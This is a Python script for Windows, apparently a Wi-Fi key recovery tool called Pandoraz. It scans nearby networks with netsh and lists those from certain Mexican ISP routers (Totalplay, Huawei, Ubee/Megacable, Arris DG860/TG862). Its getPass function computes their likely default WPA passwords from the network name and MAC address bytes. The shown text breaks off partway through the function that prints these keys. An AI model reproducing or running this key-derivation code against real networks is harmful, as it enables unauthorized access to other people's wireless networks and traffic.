# -*- Coding: UTF-8 -*-
# Python
# Windows
#
#   ██████╗  █████╗ ███╗   ██╗██████╗  ██████╗ ██████╗  █████╗ ███████╗
#   ██╔══██╗██╔══██╗████╗  ██║██╔══██╗██╔═══██╗██╔══██╗██╔══██╗╚══███╔╝
#   ██████╔╝███████║██╔██╗ ██║██║  ██║██║   ██║██████╔╝███████║  ███╔╝ 
#   ██╔═══╝ ██╔══██║██║╚██╗██║██║  ██║██║   ██║██╔══██╗██╔══██║ ███╔╝  
#   ██║     ██║  ██║██║ ╚████║██████╔╝╚██████╔╝██║  ██║██║  ██║███████╗
#   ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
#                                                         By: LawlietJH
#                                                               v1.6.6
#                                                               vex1.1
# vex = Versión Exe.

from WinColor import *		# Descargar: https://github.com/LawlietJH/WinColor.
import keyboard
import win32api
import datetime
import random
import locale 
import msvcrt
import time
import sys
import os



#=======================================================================



Version = "v1.6.6 - vex1.1"
GitHub = "https://github.com/LawlietJH/Pandoraz"

B_PANDORA1, B_Z1 = "      ██████╗  █████╗ ███╗   ██╗██████╗  ██████╗ ██████╗  █████╗ ", "███████╗"
B_PANDORA2, B_Z2 = "      ██╔══██╗██╔══██╗████╗  ██║██╔══██╗██╔═══██╗██╔══██╗██╔══██╗", "╚══███╔╝"
B_PANDORA3, B_Z3 = "      ██████╔╝███████║██╔██╗ ██║██║  ██║██║   ██║██████╔╝███████║", "  ███╔╝ "
B_PANDORA4, B_Z4 = "      ██╔═══╝ ██╔══██║██║╚██╗██║██║  ██║██║   ██║██╔══██╗██╔══██║", " ███╔╝  "
B_PANDORA5, B_Z5 = "      ██║     ██║  ██║██║ ╚████║██████╔╝╚██████╔╝██║  ██║██║  ██║", "███████╗"
B_PANDORA6, B_Z6 = "      ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝", "╚══════╝"
# Fuente: ANSI Shadow - http://patorjk.com/software/taag/#p=display&f=ANSI%20Shadow&t=Pandoraz

A_L1, A_AWLIET1, A_JH1 = "╦  ", "┌─┐┬ ┬┬  ┬┌─┐┌┬┐", "╦╦ ╦"
A_L2, A_AWLIET2, A_JH2 = "║  ", "├─┤││││  │├┤  │ ", "║╠═╣"
A_L3, A_AWLIET3, A_JH3 = "╩═╝", "┴ ┴└┴┘┴─┘┴└─┘ ┴", "╚╝╩ ╩"
# Fuente: Calvin S - http://patorjk.com/software/taag/#p=display&f=Calvin%20S&t=LawlietJH



#=======================================================================



def Dat():	# Función Que Permite Mostrar Los Datos Del Script.
	
	os.system("cls && Title Pandoraz.exe                "+\
			"By: LawlietJH                "+Version+"    ")
	
	print("\n\n\n\n")
	color("AGM"), print(B_PANDORA1, end=""), color("RC"), print(B_Z1, end="\n")
	color("AGM"), print(B_PANDORA2, end=""), color("RC"), print(B_Z2, end="\n")
	color("AGM"), print(B_PANDORA3, end=""), color("RC"), print(B_Z3, end="\n")
	color("AGM"), print(B_PANDORA4, end=""), color("RC"), print(B_Z4, end="\n")
	color("AGM"), print(B_PANDORA5, end=""), color("RC"), print(B_Z5, end="\n")
	color("AGM"), print(B_PANDORA6, end=""), color("RC"), print(B_Z6, end="\n")
	print("\n")
	color("VC"), print("\n\t\t\t    "+A_L1, end=""), color("V"), print(A_AWLIET1, end=""), color("VC"), print(A_JH1, end=""),
	color("VC"), print("\n\t\t\t    "+A_L2, end=""), color("V"), print(A_AWLIET2, end=""), color("VC"), print(A_JH2, end=""),
	color("VC"), print("\n\t\t\t    "+A_L3, end=""), color("V"), print(A_AWLIET3, end=""), color("VC"), print(A_JH3, end="")
	print("\n")
	color("RC"), print("\n\t\t\t\tv", end=""), color("PC"), print("1.6.4", end="")
	color("RC"), print(" -- vex", end=""), color("PC"), print("1.1\n\n")
	
	color("V"), print("\t\t Descarga: ", end=""), color("AZC"), print(GitHub), color("VC")
	try:
		os.system("TimeOut /NoBreak 3 > Nul")
	except:
		Dat()



def Pause(Quiet=True):		# Hace Una Pausa.
	
	if Quiet: os.system("Pause > Nul")		# No muestra Nada En Pantalla.
	
	else: os.system("Pause")		# Muestra En Pantalla: Presione una tecla para continuar...



def Salir(Num=0):	# Fucnión Que Permite Salir Del Script Sin Error Alguno.
	
	try:
		Sleep(1.5)
		sys.exit(Num)
	except KeyboardInterrupt:
		Salir(Num)



def Sleep(Num=1.5):	# Hace una Pausa Temporal.
	
	time.sleep(Num)



def Ctrl_C():
	
	try:
		print("\n\n\n\n\t\t", end=""), Mark("!","RC","R"), print("Cancelado...")
		os.system("title Cancelando... && timeout /nobreak 03 > Nul")
		return
		
	except KeyboardInterrupt:
		
		Ctrl_C()



#=======================================================================



Inter = "Wi-Fi"
Boo = False
RxD = False
Red = False
Redes = []
Interfaces = {}
Pwd = {}
Resp = 0
Tam = 0
Eny = 0



#=======================================================================



def Hex_Dec(Hex):	#~ Hexadecimal a Decimal.
	
	xD = ""
	Hex += " "
	Lista = []
	Decimal = ""
	Hex = Hex.upper()				#~ Pone Todo En Mayusculas.
	
	#~ Se Separa la Cadena con un Espacio en Cada Número.
	for i in Hex:
		
		if i != " ": xD = xD + i
		else: Lista.append(str(eval("0x" + xD)) + " "); xD = ""	#~ Se Añade Cada Número a la Lista.
	
	for Dec in Lista: Decimal += Dec	#~ Se Añade Cada Número a la Cadena.
	
	return Decimal



def Dec_Hex(Dec):	#~ Decimal a Hexadecimal.
	
	xD = ""
	Lista = []
	Hexadecimal = ""
	
	for Hex in Dec:
	
		if Hex != " ": xD = xD + Hex
		else:
			xD = hex(int(xD)).split('x')[1]
			Lista.append(xD+" ")
			xD = ""
	
	xD = hex(int(xD)).split('x')[1]
	Lista.append(xD)
	
	for Hexa in Lista: Hexadecimal += Hexa
	
	Hexadecimal = Hexadecimal.upper()
	
	return Hexadecimal



#=======================================================================



def Chk_WiFi(Cadena):
	
	global RxD, Resp, Inter
	
	while True:
		
		if RxD == False:
						
			Clear()
		
			print("\n\n   ", end=""), Mark("+"), color("VC"), print(" Lista De Interfacez De Red Disponibles:")
			
			if "Wi-Fi" in Cadena:
			
				print("\n\n\t ", end=""), Mark("*"), color("VC"), print(" 1 - Wi-Fi")
					
				for x in range(12):
								
					if ("Wi-Fi " + str(x+1)) in Cadena:
						
						print("\n\t ", end=""), Mark("*"), color("VC"), print(" " + str(x+1) + " - Wi-Fi " + str(x+1))
				
				Inter = "Wi-Fi"
				
			elif "Conexi" in Cadena:
			
				print("\n\n\t ", end=""), Mark("*"), color("VC"), print(" 1 - Conexión de red inalámbrica")
				
				for x in range(12):
								
					if ("Conexi¢n de red inal mbrica " + str(x+1)) in Cadena:
						
						print("\n\t ", end=""), Mark("*"), color("VC"), print(" " + str(x+1) + " - Conexión de red inalámbrica " + str(x+1))
				
				Inter = "Conexi¢n de red inal mbrica"
				
			try:
				print("\n\n\t ", end=""), Mark("+"), color("VC"), print(" Selecciona Una Interfaz: ")
				Resp = PressON("",True)
				
				if Resp == "": print("\n\n\t ", end=""), Mark("!"), color("VC"), print(" Elige Una Opción!"), Sleep(1)
				else:
					
					if Resp == "\x03": Dat(), Salir(0)
					
					if int(Resp) > 1: Inter += " " + str(int(Resp))
					
					if Inter in Cadena:
												
						Resp = int(Resp)
						RxD = True
						break
						
					else: print("\n\n\t\t ", end=""), Mark("!"), color("VC"), print(" Opción Inexistente!"), Sleep(1)
				
			except KeyboardInterrupt:
				Dat()
				Salir(0)
			except ValueError: print("\n\n\t\t ", end=""), Mark("!"), color("VC"), print(" Caracter No Valido!"), Sleep(1)
			
			except EOFError:
				Dat()
				Salir(1)
			except Exception as ex: print(type(ex).__name__), Sleep(1)
			
		
		else: break
	
	xD = Cadena.split("Nombre de interfaz : ")[1:]
				
	for x in xD:
		
		NomInt = x.split("\n")[0].strip()
		Interfaces[NomInt] = x
		
	Cadena = Interfaces[Inter]
	
	return Cadena



def ObtenerRedes():
	
	global Tam, RxD, Eny
	Bool = False
	Tam = 0
	Resp = ""
	Cont = 0
	Cony = 0
	
	ESSID = []	# Nombre De La Red Wifi.
	BSSID = []	# Dirección MAC De La Red Wifi.
	Senial = []	# Porcentaje de Señal De La Red Wifi.
	Canal = []	# Canal De La Red Wifi.
	Encrip = []	# Tipo de Encriptación De La Red Wifi (WEP, WPA, WPA2).
	Autentic = []	# Tipo de Autenticación De La Red Wifi.
	Cifrado = []	# Tipo de Cifrado De La Red Wifi.
	Seguridad = {}	# Canal De La Red Wifi.
	Datos = {}	# Diccionario Que Almacenará Las Listas.
	
	Comando = "netsh wlan show networks mode=Bssid"
	Cadena = os.popen(Comando)
	Cadena = Cadena.read()
	
	NoInterfaces = "El Servicio de"
	
	if NoInterfaces in Cadena:
		
		try:
			print("\n\n\t\t ", end=""), Mark("!"), color("VC"), print(" No hay Interfaces de Red wi-Fi Disponibles!\n\n")
			print("\n\n\t ", end=""), Mark("!"), color("VC"), print(" Saliendo...")
			Sleep(3)
			Dat()
			Salir(0)
		except KeyboardInterrupt:
			Dat()
			Salir(0)
	
	Eny = Cadena.count("Wi-Fi")		# Se Obtiene El Número De Tarjetas Wi-Fi Disponibles.
	
	if Eny == 0: Eny = Cadena.count("Conexi¢n de red inal mbrica")
	
	if Eny > 1:
		
		Bool = True
		Cadena = Chk_WiFi(Cadena)
		
	os.system("cls && Title Pandoraz.exe                "+\
			"By: LawlietJH                "+Version+"    ")
	
	Cadena = Cadena.split("\n")
	
	Chk_Info(Cadena, Bool)
		
	for x in Cadena:
		
		if "SSID" in x:
			
			if "Ç­" in x: x = x.replace("Ç­", "á")
			elif "Ç¸" in x: x = x.replace("Ç¸", "é")
			elif "Çð" in x: x = x.replace("Çð", "í")
			elif "Çü" in x: x = x.replace("Çü", "ó")
			elif "Ç§" in x: x = x.replace("Ç§", "ú")
			
			Cont += 1
			x = x.split(" : ")[1]
			
			if Cont == 1:
				
				ESSID.append(x)
				Tam += 1
				
			elif Cont == 2:
				
				x = x.upper()
				BSSID.append(x)
				Cont = 0
				
		elif "Autentica" in x:
			
			x = x.split(" : ")[1].strip()
			if "-" in x:
				x = x.replace("Personal", "PSK")
				Encrip.append(x.split("-")[0])
				Autentic.append(x.split("-")[1])
			else:
				x = x.replace("Abierta", "Open")
				Encrip.append(x)
				Autentic.append(x)
				
		elif "Cifrado" in x:
			
			x = x.split(" : ")[1].strip()
			Cifrado.append(x)
			
		elif "Se" in x:
			
			x = x.split(" : ")[1]
			Senial.append(x)
		
		elif "Canal" in x:
		
			x = x.split(" : ")[1]
			Canal.append(x)
	
	Datos["ESSID"] = ESSID
	Datos["BSSID"] = BSSID
	Datos["Senial"] = Senial
	Datos["Canal"] = Canal
	Datos["Encri"] = Encrip
	Datos["Cifra"] = Cifrado
	Datos["Auten"] = Autentic
	
	return Datos



def Chk_Info(Cadena, Bool):
	
	Conty = 0
	xD = ""
	
	if Bool == False:
		
		for X in Cadena:
			
			Conty += 1
			
			if Conty == 1:
				if X.startswith("No hay ninguna interfaz"):
					
					print("\n\n\t ", end=""), Mark("+"), color("VC"), print(" No hay ninguna interfaz inalámbrica en el sistema.\n\t", end="")
					Conty = 0
				#~ else:
					#~ xD += "\n\n\t [+] " + X + "\n\t"
			
			elif Conty == 2:
				if "Conexi¢n de red inal mbrica" in X:
					
					X = X.replace("¢","ó")
					X = X.replace(" ","á")
					
					print("\n\n\t ", end=""), Mark("+"), color("VC"), print(" Nombre de interfaz : ", end="")
					color("AGMC"), print(X.replace("Nombre de interfaz : ", "") + "\n\n\t ", end=""), Mark("*"), print(" ", end="")
				else:
					print("\n\n\t ", end=""), Mark("+"), color("VC"), print(" Nombre de interfaz : ", end="")
					color("AGMC"), print(X.replace("Nombre de interfaz : ", "") + "\n\n\t ", end=""), Mark("*"), print(" ", end="")
			elif Conty == 3:
				if X.startswith("La"):
					color("VC")
					print("La interfaz de la red de área local inalámbrica está apagada.", end="")
				else: color("VC"), print(X, end="")
	else:
		
		for X in Cadena:
			
			Conty += 1
			
			if Conty == 1:
				if X.startswith("Conexi¢n de red inal mbrica"):
					
					X = X.replace("¢","ó")
					X = X.replace(" ","á")
					
					print("\n\n\t ", end=""), Mark("+"), color("VC"), print(" Nombre de interfaz : ", end="")
					color("AGMC"), print(X + "\n\n\t ", end=""), Mark("*"), print(" ", end="")
				else:
					print("\n\n\t ", end=""), Mark("+"), color("VC"), print(" Nombre de interfaz : ", end="")
					color("AGMC"), print(X + "\n\n\t ", end=""), Mark("*"), print(" ", end="")
			elif Conty == 2:
				if X.startswith("La"):
					color("VC")
					print("La interfaz de la red de área local inalámbrica está apagada.", end="")
				else: color("VC"), print(X)



def ImprimirListaWifi(Datos):
	
	global Redes, Red, Tam, RxD
	
	Red = False
	Redes = []
	MAC = []
	Cont = 0
	Con = 0
	
	try:
		
		color("RC"), print("\n\n        Red ", end="")
		color("AZ"), print("(", end="")
		color("AZC"), print("ESSID", end="")
		color("AZ"), print(")      | ", end="")
		color("AGMC"), print("Señal", end="")
		color("AZ"), print(" | ", end="")
		color("AM"), print("Canal", end="")
		color("AZ"), print(" |   ", end="")
		color("VC"), print("MAC", end="")
		color("AZ"), print(" (", end="")
		color("AZC"), print("BSSID", end="")
		color("AZ"), print(")   | ", end="")
		color("RC"), print("ENC", end="")
		color("AZ"), print(" | ", end="")
		color("RC"), print("CIF", end="")
		color("AZ"), print(" | ", end="")
		color("RC"), print("AUT", end="")
		color("AZ"), print(" |", end="")
		color("R"), print("\n =============================================================================\n")
		
		if Tam == 0: print("\n\n\t ", end=""), Mark("!"), color("RC"), print(" Sin Redes Disponibles... Por Ahora...\n\n")
			
		for x in range(Tam):
			
			if x < 9:
				
				if len(Datos["ESSID"][Cont]) < 20:
					
					if ("Totalplay" in Datos["ESSID"][Cont] and len(Datos["ESSID"][Cont]) == 14)\
					or ("TOTALPLAY" in Datos["ESSID"][Cont] and len(Datos["ESSID"][Cont]) == 16)\
					or "Ubee" in Datos["ESSID"][Cont] or "Huawei" in Datos["ESSID"][Cont]:
						color("BB"), print(" *", end="")
						color("RC"), print(" {}".format(x+1), end=""), color("AZC"), print(" - ", end="")
						color("VC"), print("{}".format(Datos["ESSID"][Cont]), end=" "*(20-len(Datos["ESSID"][Cont])))
					else:
						color("RC"), print("   {}".format(x+1), end=""), color("AZC"), print(" - ", end="")
						color("VC"), print("{}".format(Datos["ESSID"][Cont]), end=" "*(20-len(Datos["ESSID"][Cont])))
					
					if len(Datos["Senial"][Cont]) == 6:
						color("AGM"), print("{}".format(Datos["Senial"][Cont][:3]), end="")
						color("AGMC"), print("%    ", end="")
					elif len(Datos["Senial"][Cont]) == 5:
						color("AGM"), print(" {}".format(Datos["Senial"][Cont][:2]), end="")
						color("AGMC"), print("%    ", end="")
					elif len(Datos["Senial"][Cont]) == 4:
						color("AGM"), print("  {}".format(Datos["Senial"][Cont][:1]), end="")
						color("AGMC"), print("%    ", end="")
						
					if len(Datos["Canal"][Cont]) == 2: color("AM"), print("  {}   ".format(Datos["Canal"][Cont]), end="")
					elif len(Datos["Canal"][Cont]) == 3: color("AM"), print(" {}   ".format(Datos["Canal"][Cont]), end="")
					
					if ("Totalplay" in Datos["ESSID"][Cont] and len(Datos["ESSID"][Cont]) == 14)\
					or ("TOTALPLAY" in Datos["ESSID"][Cont] and len(Datos["ESSID"][Cont]) == 16)\
					or "Ubee" in Datos["ESSID"][Cont] or "Huawei" in Datos["ESSID"][Cont]:
						MAC = Datos["BSSID"][Cont].split(":")
						for byte in MAC:
							Con+=1; color("VC"), print(byte, end=""),
							if len(MAC) == Con: color("V"), print("  ", end=""); Con = 0
							else: color("V"), print(":", end="")
					else: color("V"), print("{}  ".format(Datos["BSSID"][Cont]), end="")
					
					if Datos["Cifra"][Cont] == "WEP": Datos["Encri"][Cont] = "WEP"
					
					if len(Datos["Encri"][Cont]) == 4: color("VC"), print("{}  ".format(Datos["Encri"][Cont]), end="")
					elif len(Datos["Encri"][Cont]) == 3: color("VC"), print("{}   ".format(Datos["Encri"][Cont]), end="")
						
					if len(Datos["Cifra"][Cont]) == 4: color("VC"), print("{}  ".format(Datos["Cifra"][Cont]), end="")
					elif len(Datos["Cifra"][Cont]) == 3: color("VC"), print("{}   ".format(Datos["Cifra"][Cont]), end="")
						
					if len(Datos["Auten"][Cont]) == 4: color("VC"), print("{}  ".format(Datos["Auten"][Cont]))
					elif len(Datos["Auten"][Cont]) == 3: color("VC"), print("{}   ".format(Datos["Auten"][Cont]))
					
				else:
					
					if ("Totalplay" in Datos["ESSID"][Cont] and len(Datos["ESSID"][Cont]) == 14)\
					or ("TOTALPLAY" in Datos["ESSID"][Cont] and len(Datos["ESSID"][Cont]) == 16)\
					or "Ubee" in Datos["ESSID"][Cont] or "Huawei" in Datos["ESSID"][Cont]:
						color("BB"), print(" *", end="")
						color("RC"), print(" {}".format(x+1), end=""), color("AZC"), print(" - ", end="")
						color("VC"), print("{}\n".format(Datos["ESSID"][Cont]), end=" "*27)
					else:
						color("RC"), print("   {}".format(x+1), end=""), color("AZC"), print(" - ", end="")
						color("VC"), print("{}\n".format(Datos["ESSID"][Cont]), end=" "*27)
					
					if len(Datos["Senial"][Cont]) == 6:
						color("AGM"), print("{}".format(Datos["Senial"][Cont][:3]), end="")
						color("AGMC"), print("%    ", end="")
					elif len(Datos["Senial"][Cont]) == 5:
						color("AGM"), print(" {}".format(Datos["Senial"][Cont][:2]), end="")
						color("AGMC"), print("%    ", end="")
					elif len(Datos["Senial"][Cont]) == 4:
						color("AGM"), print("  {}".format(Datos["Senial"][Cont][:1]), end="")
						color("AGMC"), print("%    ", end="")
						
					if len(Datos["Canal"][Cont]) == 2: color("AM"), print("  {}   ".format(Datos["Canal"][Cont]), end="")
					elif len(Datos["Canal"][Cont]) == 3: color("AM"), print(" {}   ".format(Datos["Canal"][Cont]), end="")
					
					if ("Totalplay" in Datos["ESSID"][Cont] and len(Datos["ESSID"][Cont]) == 14)\
					or ("TOTALPLAY" in Datos["ESSID"][Cont] and len(Datos["ESSID"][Cont]) == 16)\
					or "Ubee" in Datos["ESSID"][Cont] or "Huawei" in Datos["ESSID"][Cont]:
						MAC = Datos["BSSID"][Cont].split(":")
						for byte in MAC:
							Con+=1; color("VC"), print(byte, end=""),
							if len(MAC) == Con: color("V"), print("  ", end=""); Con = 0
							else: color("V"), print(":", end="")
					else: color("V"), print("{}  ".format(Datos["BSSID"][Cont]), end="")
					
					if Datos["Cifra"][Cont] == "WEP": Datos["Encri"][Cont] = "WEP"
					
					if len(Datos["Encri"][Cont]) == 4: color("VC"), print("{}  ".format(Datos["Encri"][Cont]), end="")
					elif len(Datos["Encri"][Cont]) == 3: color("VC"), print("{}   ".format(Datos["Encri"][Cont]), end="")
						
					if len(Datos["Cifra"][Cont]) == 4: color("VC"), print("{}  ".format(Datos["Cifra"][Cont]), end="")
					elif len(Datos["Cifra"][Cont]) == 3: color("VC"), print("{}   ".format(Datos["Cifra"][Cont]), end="")
						
					if len(Datos["Auten"][Cont]) == 4: color("VC"), print("{}  ".format(Datos["Auten"][Cont]))
					elif len(Datos["Auten"][Cont]) == 3: color("VC"), print("{}   ".format(Datos["Auten"][Cont]))
			else:
				
				if len(Datos["ESSID"][Cont]) < 20:
					
					if ("Totalplay" in Datos["ESSID"][Cont] and len(Datos["ESSID"][Cont]) == 14)\
					or ("TOTALPLAY" in Datos["ESSID"][Cont] and len(Datos["ESSID"][Cont]) == 16)\
					or "Ubee" in Datos["ESSID"][Cont] or "Huawei" in Datos["ESSID"][Cont]:
						color("BB"), print(" *", end="")
						color("RC"), print("{}".format(x+1), end=""), color("AZC"), print(" - ", end="")
						color("VC"), print("{}".format(Datos["ESSID"][Cont]), end=" "*(20-len(Datos["ESSID"][Cont])))
					else:
						color("RC"), print("  {}".format(x+1), end=""), color("AZC"), print(" - ", end="")
						color("VC"), print("{}".format(Datos["ESSID"][Cont]), end=" "*(20-len(Datos["ESSID"][Cont])))
					
					if len(Datos["Senial"][Cont]) == 6:
						color("AGM"), print("{}".format(Datos["Senial"][Cont][:3]), end="")
						color("AGMC"), print("%    ", end="")
					elif len(Datos["Senial"][Cont]) == 5:
						color("AGM"), print(" {}".format(Datos["Senial"][Cont][:2]), end="")
						color("AGMC"), print("%    ", end="")
					elif len(Datos["Senial"][Cont]) == 4:
						color("AGM"), print("  {}".format(Datos["Senial"][Cont][:1]), end="")
						color("AGMC"), print("%    ", end="")
						
					if len(Datos["Canal"][Cont]) == 2: color("AM"), print("  {}   ".format(Datos["Canal"][Cont]), end="")
					elif len(Datos["Canal"][Cont]) == 3: color("AM"), print(" {}   ".format(Datos["Canal"][Cont]), end="")
					
					if ("Totalplay" in Datos["ESSID"][Cont] and len(Datos["ESSID"][Cont]) == 14)\
					or ("TOTALPLAY" in Datos["ESSID"][Cont] and len(Datos["ESSID"][Cont]) == 16)\
					or "Ubee" in Datos["ESSID"][Cont] or "Huawei" in Datos["ESSID"][Cont]:
						MAC = Datos["BSSID"][Cont].split(":")
						for byte in MAC:
							Con+=1; color("VC"), print(byte, end=""),
							if len(MAC) == Con: color("V"), print("  ", end=""); Con = 0
							else: color("V"), print(":", end="")
					else: color("V"), print("{}  ".format(Datos["BSSID"][Cont]), end="")
					
					if Datos["Cifra"][Cont] == "WEP": Datos["Encri"][Cont] = "WEP"
					
					if len(Datos["Encri"][Cont]) == 4: color("VC"), print("{}  ".format(Datos["Encri"][Cont]), end="")
					elif len(Datos["Encri"][Cont]) == 3: color("VC"), print("{}   ".format(Datos["Encri"][Cont]), end="")
						
					if len(Datos["Cifra"][Cont]) == 4: color("VC"), print("{}  ".format(Datos["Cifra"][Cont]), end="")
					elif len(Datos["Cifra"][Cont]) == 3: color("VC"), print("{}   ".format(Datos["Cifra"][Cont]), end="")
						
					if len(Datos["Auten"][Cont]) == 4: color("VC"), print("{}  ".format(Datos["Auten"][Cont]))
					elif len(Datos["Auten"][Cont]) == 3: color("VC"), print("{}   ".format(Datos["Auten"][Cont]))
				
				else:
					
					if ("Totalplay" in Datos["ESSID"][Cont] and len(Datos["ESSID"][Cont]) == 14)\
					or ("TOTALPLAY" in Datos["ESSID"][Cont] and len(Datos["ESSID"][Cont]) == 16)\
					or "Ubee" in Datos["ESSID"][Cont] or "Huawei" in Datos["ESSID"][Cont]:
						color("BB"), print(" *", end="")
						color("RC"), print("{}".format(x+1), end=""), color("AZC"), print(" - ", end="")
						color("VC"), print("{}\n".format(Datos["ESSID"][Cont]), end=" "*27)
					else:
						color("RC"), print("  {}".format(x+1), end=""), color("AZC"), print(" - ", end="")
						color("VC"), print("{}\n".format(Datos["ESSID"][Cont]), end=" "*27)
					
					if len(Datos["Senial"][Cont]) == 6:
						color("AGM"), print("{}".format(Datos["Senial"][Cont][:3]), end="")
						color("AGMC"), print("%    ", end="")
					elif len(Datos["Senial"][Cont]) == 5:
						color("AGM"), print(" {}".format(Datos["Senial"][Cont][:2]), end="")
						color("AGMC"), print("%    ", end="")
					elif len(Datos["Senial"][Cont]) == 4:
						color("AGM"), print("  {}".format(Datos["Senial"][Cont][:1]), end="")
						color("AGMC"), print("%    ", end="")
						
					if len(Datos["Canal"][Cont]) == 2: color("AM"), print("  {}   ".format(Datos["Canal"][Cont]), end="")
					elif len(Datos["Canal"][Cont]) == 3: color("AM"), print(" {}   ".format(Datos["Canal"][Cont]), end="")
					
					if ("Totalplay" in Datos["ESSID"][Cont] and len(Datos["ESSID"][Cont]) == 14)\
					or ("TOTALPLAY" in Datos["ESSID"][Cont] and len(Datos["ESSID"][Cont]) == 16)\
					or "Ubee" in Datos["ESSID"][Cont] or "Huawei" in Datos["ESSID"][Cont]:
						MAC = Datos["BSSID"][Cont].split(":")
						for byte in MAC:
							Con+=1; color("VC"), print(byte, end=""),
							if len(MAC) == Con: color("V"), print("  ", end=""); Con = 0
							else: color("V"), print(":", end="")
					else: color("V"), print("{}  ".format(Datos["BSSID"][Cont]), end="")
					
					if Datos["Cifra"][Cont] == "WEP": Datos["Encri"][Cont] = "WEP"
					
					if len(Datos["Encri"][Cont]) == 4: color("VC"), print("{}  ".format(Datos["Encri"][Cont]), end="")
					elif len(Datos["Encri"][Cont]) == 3: color("VC"), print("{}   ".format(Datos["Encri"][Cont]), end="")
						
					if len(Datos["Cifra"][Cont]) == 4: color("VC"), print("{}  ".format(Datos["Cifra"][Cont]), end="")
					elif len(Datos["Cifra"][Cont]) == 3: color("VC"), print("{}   ".format(Datos["Cifra"][Cont]), end="")
						
					if len(Datos["Auten"][Cont]) == 4: color("VC"), print("{}  ".format(Datos["Auten"][Cont]))
					elif len(Datos["Auten"][Cont]) == 3: color("VC"), print("{}   ".format(Datos["Auten"][Cont]))
				
			getNameRedes(Datos, Cont)
			
			Cont += 1
	
		color("R"), print("\n =============================================================================")
	
	except IndexError:
		
		print("\t\t"), Mark("!"), color("RC"), print(" Surgió Un Error! Restaurando!...")
		color("R"), print("\n =============================================================================")
		time.sleep(3)
		RxD = False



def getNameRedes(Datos, Pos):
	
	global Red, Redes
	
	if "Totalplay" in Datos["ESSID"][Pos]:		# Para redes Totalplay de 4 Caracteres: Totalplay-XXXX 
			Red = True
			Redes.append(Datos["ESSID"][Pos])
			Redes.append(Datos["Senial"][Pos])
			Redes.append(Datos["Canal"][Pos])
			Redes.append(Datos["BSSID"][Pos])
	
	elif "Huawei" in str(Datos["ESSID"][Pos]):		# Para redes Huawei: Huawei-XXXX-XXXX 
		
			Red = True
			Redes.append(Datos["ESSID"][Pos])
			Redes.append(Datos["Senial"][Pos])
			Redes.append(Datos["Canal"][Pos])
			Redes.append(Datos["BSSID"][Pos])
			
	elif "TOTALPLAY" in str(Datos["ESSID"][Pos]):		# Para redes Totalplay de 6 Caracteres: TOTALPLAY_XXXXXX 
			
			Red = True
			Redes.append(Datos["ESSID"][Pos])
			Redes.append(Datos["Senial"][Pos])
			Redes.append(Datos["Canal"][Pos])
			Redes.append(Datos["BSSID"][Pos])

	elif "DG860" in str(Datos["ESSID"][Pos]) or "TG862" in str(Datos["ESSID"][Pos]):	# Para redes Arris DG860/TG862
			
			Red = True
			Redes.append(Datos["ESSID"][Pos])
			Redes.append(Datos["Senial"][Pos])
			Redes.append(Datos["Canal"][Pos])
			Redes.append(Datos["BSSID"][Pos])
			
	elif "Ubee" in str(Datos["ESSID"][Pos]):	# Para redes UbeeXXXX (De Megacable)
			
			Red = True
			Redes.append(Datos["ESSID"][Pos])
			Redes.append(Datos["Senial"][Pos])
			Redes.append(Datos["Canal"][Pos])
			Redes.append(Datos["BSSID"][Pos])
	
	#~ elif len(Datos["ESSID"][Pos]) == 6:		# Para redes Cisco/Pegatron
			
			#~ Red = True
			#~ Redes.append(Datos["ESSID"][Pos])
			#~ Redes.append(Datos["Senial"][Pos])
			#~ Redes.append(Datos["Canal"][Pos])
			#~ Redes.append(Datos["BSSID"][Pos])



def getPass(Nombre, MAC):
	
	Nomb1, Nomb2 = "", ""
	Pass = ""
	xD = ""
	
	if "Totalplay" in Nombre:	# Para redes Totalplay de 4 Caracteres: Totalplay-XXXX.
		
		try: xD = Nombre.split("-")[1]
		except: Pass = "UNKNOWN"
		
		if len(xD) == 4:
			
			Nombre = Nombre[-4:]
			MAC = MAC.split(":")
			Pass = MAC[3] + MAC[4] + Nombre
			
		else: Pass = "UKNOWN"
	
	elif "Huawei" in Nombre:		# Para redes Huawei-XXXX-XXXX.
		
		try: xD = Nombre.split("-")[2]
		except: Pass = "UNKNOWN"
		
		if len(xD) == 4:
			
			Nombre = Nombre[-4:]
			MAC = MAC.split(":")
			Pass = MAC[3] + MAC[4] + Nombre
			
		else:  Pass = "UKNOWN"
		
	elif "TOTALPLAY" in Nombre:	# Para redes Totalplay de 6 Caracteres: TOTALPLAY_XXXXXX.
		
		MAC = MAC.split(":")
		
		Pass = MAC[3].upper() + MAC[4].upper() + MAC[4].lower() + MAC[5].lower()
		
	elif "Ubee" in Nombre:	# Para redes UbeeXXXX de Megacable. 
		
		Byte6 = MAC.split(":")[-1]
		Byte5 = MAC.split(":")[-2]
		Bytes = Byte5 + Byte6
		
		Dec = str(int(Hex_Dec(Bytes))-4)
		Hex = Dec_Hex(Dec)
		
		Pass = ''.join(MAC.split(":")[1:4]) + Hex
		
	elif "DG860" in Nombre or "TG862" in Nombre:	# Para Redes Arris DG860XXX/TG862XXX.
		
		if len(Nombre) == 8:
			
			Nombre1 = Nombre[:6]
			Nombre2 = Nombre[-2:]
			MAC = MAC.split(":")
			Pass = Nombre1 + MAC[3] + MAC[4] + Nombre2
		
		else: Pass = "UNKNOWN"
		
	return Pass



def getPassRedes():
	
	global Redes, Pwd
	
	MAC = []
	Con = 0
	Cont = 0
	Cony = 0
	Name = ""
	Pass = ""
	
	print("\n ", end=""), Mark("+"), color("BB"), print(" Contraseñas Posibles De Redes Conseguidas:")
	
	if len(Redes) != 0:
		
		color("RC"), print("\n\t  Red ", end="")
		color("AZ"), print("(", end="")
		color("AZC"), print("ESSID", end="")
		color("AZ"), print(") \t   | ", end="")
		color("AGMC"), print("Señal", end="")
		color("AZ"), print(" | ", end="")
		color("AM"), print("Canal", end="")
		color("AZ"), print(" |   ", end="")
		color("VC"), print("MAC ", end="")
		color("AZ"), print("(", end="")
		color("AZC"), print("BSSID", end="")
		color("AZ"), print(")   | ", end="")
		color("BB"), print("* ", end="")
		color("V"), print("WPA Key\n")
		
		for X in Redes:
			
			Cont += 1
			
			if Cont == 1:
				
				Cony += 1
				Name = X
				
				print(" ", end=""), Mark("*"), color("RC"), print(" {}".format(Cony), end="")
				color("AZ"), print(" - ", end="")
				color("VC"), print("{}".format(X), end=" "*(20-len(X)))
			
			elif Cont == 2:
